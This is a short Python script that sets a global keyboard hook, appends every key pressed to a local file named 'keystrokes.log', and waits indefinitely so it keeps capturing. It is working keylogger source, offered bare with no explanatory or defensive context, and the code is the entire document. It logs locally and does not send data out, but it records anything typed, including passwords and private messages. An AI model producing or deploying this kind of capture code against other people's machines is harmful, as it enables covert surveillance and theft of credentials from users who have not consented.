import keyboard
log_file = "keystrokes.log"

def on_key_press(event):
    """saves keystrokes to a log file"""
    with open(log_file, "a") as f:
        f.write(event.name)

keyboard.on_press(on_key_press)

# keeps program running to collect keystrokes
keyboard.wait()